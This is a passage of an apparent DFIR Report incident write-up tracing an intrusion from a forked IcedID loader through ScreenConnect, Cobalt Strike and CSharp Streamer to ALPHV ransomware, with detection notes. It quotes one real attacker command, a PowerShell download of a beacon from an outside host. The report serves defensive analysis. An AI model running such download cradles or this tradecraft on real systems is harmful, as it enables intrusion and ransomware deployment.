		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Friday, October 25, 2024</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-34931" class="post-34931 post type-post status-publish format-standard hentry category-alphv category-cobaltstrike category-icedid category-ransomware entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-131" href="https://thedfirreport.com/category/alphv/">alphv</a>
		
			<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
		
			<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
		
			<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" rel="bookmark"><time class="entry-date published" datetime="2024-06-10T00:44:23+00:00">June 10, 2024</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 id="key" class="wp-block-heading"><a href="#key">Key Takeaways</a></h2>



<ul class="wp-block-list">
<li>In October 2023, we observed an intrusion that began with a spam campaign, distributing a forked IcedID loader.</li>



<li>The threat actor used Impacket&#8217;s wmiexec and RDP to install ScreenConnect on multiple systems, enabling them to execute various commands and deploy Cobalt Strike beacons.</li>



<li>Their toolkit also included CSharp Streamer, a RAT written in CSharp with numerous functionalities, as documented <a href="https://cyber.wtf/2023/12/06/the-csharp-streamer-rat/" target="_blank" rel="noreferrer noopener">here</a>.</li>



<li>The attacker used a custom tool to stage, and exfiltrate data, using Rclone.</li>



<li>Eight days after initial access, ALPHV ransomware was deployed across all domain joined Windows systems.</li>
</ul>
<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noopener">Amazon</a>.</p>



<h2 class="wp-block-heading" id="services"><a href="#services">The DFIR Report Services</a></h2>
<p>→ Click <a href="https://the-dfir-report-store.myshopify.com/products/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment-public-case-24952" target="_blank" rel="noopener">here</a> to access the DFIR Lab related to this report ←</p>
<p>Five new sigma rules were created from this report and added to our Private sigma Rules</p>
<p>Our Threat Feed was tracking the Cobalt Strike server in this case days before this case.</p>







<ul class="wp-block-list">
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>



<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>



<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>



<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>



<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>



<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for a demo!</p>

<h4>Table of Contents:</h4>
<ul>
<li><a href="#case-summary">Case Summary</a></li>
<li><a href="#services">The DFIR Report Services</a></li>
<li><a href="#analysts">Analysts</a></li>
<li><a href="#initial-access">Initial Access</a></li>
<li><a href="#execution">Execution</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#defense-evasion">Defense Evasion</a></li>
<li><a href="#credential-access">Credential Access</a></li>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#lateral-movement">Lateral Movement</a></li>
<li><a href="#collection">Collection</a></li>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#exfiltration">Exfiltration</a></li>
<li><a href="#impact">Impact</a></li>
<li><a href="#timeline">Timeline</a></li>
<li><a href="#diamond-model">Diamond Model</a></li>
<li><a href="#indicators">Indicators</a></li>
<li><a href="#detections">Detections</a></li>
<li><a href="#mitre">MITRE ATT&amp;CK</a></li>
</ul>

<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>



<p>This intrusion began in October 2023 with a malicious email that enticed the recipient to download a zip archive containing a Visual Basic Script (VBS) and a benign README file. We assess with high confidence that this email was part of a spam campaign delivering a forked variant of IcedID. First reported by <a href="https://www.proofpoint.com/us/blog/threat-insight/fork-ice-new-era-icedid" target="_blank" rel="noreferrer noopener">ProofPoint </a>in February 2023, this forked IcedID variant lacks banking functionality and prioritizes payload delivery. Upon user interaction with the archive&#8217;s contents, the VBS file was executed, initiating the embedded forked IcedID loader.</p>



<p>This was followed by the creation of a scheduled task to maintain persistence on the beachhead. The forked IcedID loader then communicated with a command and control server, leading to the dropping and execution of another IcedID DLL. Approximately two minutes after execution, the first round of discovery was observed using Windows native binaries, mirroring the activity seen in previously reported <a href="https://thedfirreport.com/?s=IcedID" target="_blank" rel="noopener">IcedID cases</a>.</p>



<p>Around two hours into the intrusion, the threat actor installed ScreenConnect on the beachhead using a renamed installer binary, &#8220;toovey.exe.&#8221; They executed multiple commands on the host via ScreenConnect. These commands included Windows utilities such as nltest and net for reconnaissance. They also used PowerShell cradles, bitsadmin, and certutil to attempt retrieval of Cobalt Strike beacons on the beachhead. They had a few stumbles while trying to download the Cobalt Strike beacons using <a href="http://temp.sh" target="_blank" rel="noreferrer noopener">temp.sh</a>, resulting in downloading the HTML of the website rather than their intended payload file.</p>



<p>Once the Cobalt Strike beacons were executed, they established communication with the Cobalt Strike command and control server. Within 20 minutes of this activity, a new payload, cslite.exe (CSharp Streamer C2), was dropped on the beachhead. CSharp Streamer is a multi-function remote access trojan that was first reported in 2021. During this intrusion, it was first used to access the LSASS process on the beachhead for credential access; and around 40 minutes after that, the threat actor performed a dcsync operation from the beachhead host to one of the domain controllers. The threat actor then copied a renamed ScreenConnect installer from the beachhead to a domain controller over SMB. The installation was completed using Impacket&#8217;s wmiexec script to remotely run the ScreenConnect installer.</p>



<p>After installing ScreenConnect, we observed a log in to the domain controller using ScreenConnect to access the host. During this session, the threat actor dropped several CSharp Streamer payloads. Although they executed the files, we did not observe any network traffic to a command and control server at that time. Activity then ceased for approximately eight hours.</p>



<p>On the second day, the threat actor returned and performed network discovery on the domain controller using <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect&#8217;s network scanner</a>. They then initiated an RDP connection from the domain controller to a backup server. The threat actor reviewed backups and running processes before dropping both a CSharp Streamer binary and a previously used ScreenConnect installer. These were then executed over the RDP session. Next, a Cobalt Strike beacon was run, and LSASS was accessed on the host.</p>



<p>Around eleven hours later, the threat actor dropped several Cobalt Strike beacons and attempted to execute them; however, no new command and control traffic was observed. The threat actor quickly removed the files. Four hours later, another ScreenConnect installer was dropped on the backup server and executed using wmiexec. A new RDP connection was then initiated to a second domain controller, and netscan was run again. Following this, ScreenConnect was installed on the second domain controller, and an RDP session was started from this domain controller to a file server. On the file server, both a Cobalt Strike beacon and the ScreenConnect installer were dropped and executed via the RDP session.</p>



<p>After three days of no significant activity, the threat actor returned. They dropped and executed a new ScreenConnect installer on the backup server via wmiexec and ran netscan again. Using RDP, they connected to the file server and used Mozilla Firefox to preview a few financial documents before running netscan there as well.</p>



<p>The following day, a custom tool named &#8220;confucius_cpp&#8221; was dropped on the file server. Its functionalities included aggregation, staging, and compression of sensitive files. We observed the threat actor performing Google searches for the keyword &#8220;rclone&#8221; and subsequently downloading the rclone application on the file server. Instead of direct execution, the Rclone binary was started using a VBS script. Upon execution of this script, the previously staged data was successfully exfiltrated using Rclone to a remote server.</p>



<p>On day seven of the intrusion, a RDP connection was initiated from the beachhead to the backup and the file server using CSharp Streamer. New ScreenConnect installers appear yet again and followed the same WMI execution pattern as before.</p>





<p>On the final day of the intrusion, the threat actor proceeded to push toward their final objectives. From the backup server, they ran a fresh netscan sweep and began staging both a ScreenConnect installer and an ALPHV ransomware binary. First, they used xcopy to stage the ScreenConnect installer across all Windows hosts in the domain and then executed it using a WMI command. This was then repeated for the ALPHV ransomware payload. During the execution, we observed the threat actor deleting all the backups interactively. Upon completion of the ransomware execution, a ransom note was left behind on the hosts. The time to ransomware (TTR) was around 180 hours, over the course of 8 days.</p>





<p>If you would like to get an email when we publish a new report, please subscribe <a href="https://thedfirreport.com/subscribe/" target="_blank" rel="noreferrer noopener">here</a>.</p>



<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>



<p>Analysis and reporting completed by <a href="https://twitter.com/yatinwad " target="_blank" rel="noreferrer noopener">@yatinwad</a>, and UC2.</p>



<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>



<p>Initial access began with a malicious e-mail. The malicious spam campaign can be linked to a publicly reported campaign from <a href="https://twitter.com/JAMESWT_MHT/status/1712257833524179425" target="_blank" rel="noreferrer noopener">@JAMESWT_MHT</a> encouraging victims to download and open a ZIP archive.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-34714" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-001.png" alt="" width="861" height="309" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-001.png 861w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-001-300x108.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-001-768x276.png 768w" sizes="(max-width: 861px) 100vw, 861px" /></a></p>





<p>Once the ZIP file was extracted the user was presented with a Readme and a Visual Basic Script (VBS) file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-002.png"><img decoding="async" class="aligncenter size-full wp-image-34715" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-002.png" alt="" width="699" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-002.png 699w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-002-300x64.png 300w" sizes="(max-width: 699px) 100vw, 699px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-003.png"><img decoding="async" class="aligncenter size-full wp-image-34716" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-003.png" alt="" width="615" height="714" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-003.png 615w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-003-258x300.png 258w" sizes="(max-width: 615px) 100vw, 615px" /></a></p>







<p>WScript.exe was called when executing the script, which starts the infection.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34717" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-004.png" alt="" width="1640" height="100" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-004.png 1640w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-004-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-004-1024x62.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-004-768x47.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-004-1536x94.png 1536w" sizes="(max-width: 1640px) 100vw, 1640px" /></a></p>





<p>The script embeds a DLL in a slightly obfuscated form and base64 encodes it, saves it in C:\Windows\Temp\0370-1.dll and then executes said DLL through regsvr32.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34718" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-005.png" alt="" width="1676" height="107" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-005.png 1676w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-005-300x19.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-005-1024x65.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-005-768x49.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-005-1536x98.png 1536w" sizes="(max-width: 1676px) 100vw, 1676px" /></a></p>





<p>This DLL is an IcedID loader as observed with sandboxing <a href="https://tria.ge/231012-d9q9mada6w" target="_blank" rel="noreferrer noopener">here</a>. The infection chain was concluded by the loader dropping and executing another IcedID DLL via rundll32.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34719" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-006.png" alt="" width="1731" height="93" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-006.png 1731w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-006-300x16.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-006-1024x55.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-006-768x41.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-006-1536x83.png 1536w" sizes="(max-width: 1731px) 100vw, 1731px" /></a></p>





<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>



<p><strong>ScreenConnect</strong></p>



<p>Once IcedID was operational, the threat actor used it to install the RMM tool ScreenConnect, renamed as toovey.exe.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34720" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-007.png" alt="" width="733" height="237" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-007.png 733w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-007-300x97.png 300w" sizes="(max-width: 733px) 100vw, 733px" /></a></figure>



<p>Throughout the intrusion the threat actor dropped several more renamed ScreenConnect installers, usually employed after moving laterally to a new host and then executing it through Impacket&#8217;s wmiexec.py script:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34721" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-008.png" alt="" width="723" height="271" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-008.png 723w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-008-300x112.png 300w" sizes="(max-width: 723px) 100vw, 723px" /></a></figure>



<p>Besides execution with wmiexec.py, some installers were executed during the threat actor RDP sessions:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34722" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-009.png" alt="" width="1201" height="179" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-009.png 1201w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-009-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-009-1024x153.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-009-768x114.png 768w" sizes="(max-width: 1201px) 100vw, 1201px" /></a></p>





<p>ScreenConnect was then used to execute various commands. This can be observed in logs, as ScreenConnect drops the desired script on disk, followed by the corresponding interpreter, as discussed in a previous <a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" target="_blank" rel="noreferrer noopener">report</a>. This can be seen in various events, such as Security Event ID 4688 or Sysmon Event 1, as displayed below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34723" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-010.png" alt="" width="1596" height="213" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-010.png 1596w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-010-300x40.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-010-1024x137.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-010-768x102.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-010-1536x205.png 1536w" sizes="(max-width: 1596px) 100vw, 1596px" /></a></p>





<p><strong>Cobalt Strike</strong></p>



<p>As in most intrusions we document, Cobalt Strike beacons were used in this intrusion. On the beachhead host, using ScreenConnect, the threat actor tried to download malicious Cobalt Strike beacons using bitsadmin, without success.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34724" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-011.png" alt="" width="1267" height="59" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-011.png 1267w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-011-300x14.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-011-1024x48.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-011-768x36.png 768w" sizes="(max-width: 1267px) 100vw, 1267px" /></a></p>





<p>Besides process creation event logs, bitsadmin downloads can also be detected via event ID 59 and 60 of &#8220;Microsoft-Windows-Bits-Client/Operational&#8221; log.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34725" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-012.png" alt="" width="867" height="359" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-012.png 867w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-012-300x124.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-012-768x318.png 768w" sizes="(max-width: 867px) 100vw, 867px" /></a></p>





<p>Following this failure, they used another LOLBin named certutil to download their payloads, again via ScreenConnect. This behavior was repeated to download other Cobalt Strike beacons.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34726" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-013.png" alt="" width="1105" height="99" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-013.png 1105w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-013-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-013-1024x92.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-013-768x69.png 768w" sizes="(max-width: 1105px) 100vw, 1105px" /></a></p>





<p>PowerShell was another tool used to retrieve Cobalt Strike beacons, again with some failures, and yet again using ScreenConnect.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34727" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-014.png" alt="" width="1193" height="96" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-014.png 1193w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-014-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-014-1024x82.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-014-768x62.png 768w" sizes="(max-width: 1193px) 100vw, 1193px" /></a></p>





<p>In addition to the previously mentioned methods of retrieving additional payloads, there was another instance where the attackers used <a href="http://temp.sh" target="_blank" rel="noreferrer noopener">temp.sh</a> to host their malware. However, a failure occurs when attempting to directly download a file from these links. Instead of obtaining the actual file, users end up downloading an HTML presentation page that prompts them to click a link to retrieve the file.</p>



<pre class="wp-block-preformatted">powershell Invoke-WebRequest "http://temp.sh/VSlAV/http64.exe" -OutFile C:\programdata\rr.exe
</pre>





<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34728" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-015.png" alt="" width="534" height="356" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-015.png 534w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-015-300x200.png 300w" sizes="(max-width: 534px) 100vw, 534px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34729" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-016.png" alt="" width="722" height="307" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-016.png 722w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-016-300x128.png 300w" sizes="(max-width: 722px) 100vw, 722px" /></a></figure>



<p>On another occasion, PowerShell usage was successful, and in those cases using Sysmon&#8217;s events we can trace child processes from PowerShell ParentCommandLine. For instance, the following display shows a payload used to launch https64.dll, another Cobalt Strike beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34730" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-017.png" alt="" width="1225" height="119" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-017.png 1225w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-017-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-017-1024x99.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-017-768x75.png 768w" sizes="(max-width: 1225px) 100vw, 1225px" /></a></p>





<p>Because the beacon was using plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34731" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-018.png" alt="" width="1292" height="734" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-018.png 1292w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-018-300x170.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-018-1024x582.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-018-768x436.png 768w" sizes="(max-width: 1292px) 100vw, 1292px" /></a></p>





<p>As documented in <a href="https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/" target="_blank" rel="noreferrer noopener">Cobalt Strike, a Defender’s Guide part 1</a> and <a href="https://thedfirreport.com/2022/01/24/cobalt-strike-a-defenders-guide-part-2/" target="_blank" rel="noreferrer noopener">part 2</a>, the attackers used Cobalt Strike&#8217;s default pipe names, which can be easily detected.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34732" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-019.png" alt="" width="642" height="55" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-019.png 642w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-019-300x26.png 300w" sizes="(max-width: 642px) 100vw, 642px" /></a></p>





<p><strong>Impacket</strong></p>



<p>As part of their toolkit, the threat actor used Impacket’s wmiexec.py script to perform actions. This activity can be easily observed in logs because of the default redirect of its output to \\127.0.0.1\ADMIN$\__%timestamp% (as visible in the <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py#L295" target="_blank" rel="noreferrer noopener">source code</a>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34733" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-020.png" alt="" width="469" height="724" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-020.png 469w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-020-194x300.png 194w" sizes="(max-width: 469px) 100vw, 469px" /></a></p>





<p><strong>CSharp Streamer</strong></p>



<p>During the intrusion, the threat actor deployed a binary named &#8220;cslite.exe&#8221; on the beachhead host. Upon investigation, we identified this binary as a RAT known as CSharp Streamer, thanks to an excellent <a href="https://cyber.wtf/2023/12/06/the-csharp-streamer-rat/" target="_blank" rel="noopener">write-up</a> by Hendrik Eckardt. This malware combines many different functions and is a very capable remote access trojan. During this intrusion, we observed it dumping credentials, proxying RDP traffic, and providing command and control communications for the threat actor.</p>



<p>We were able to confirm the tool using memory analysis, and identifying known functions and commands in the previously linked report.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/10/24952-021-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34821" src="https://thedfirreport.com/wp-content/uploads/2025/10/24952-021-1.png" alt="" width="729" height="859" srcset="https://thedfirreport.com/wp-content/uploads/2025/10/24952-021-1.png 729w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-021-1-255x300.png 255w" sizes="(max-width: 729px) 100vw, 729px" /></a></p>





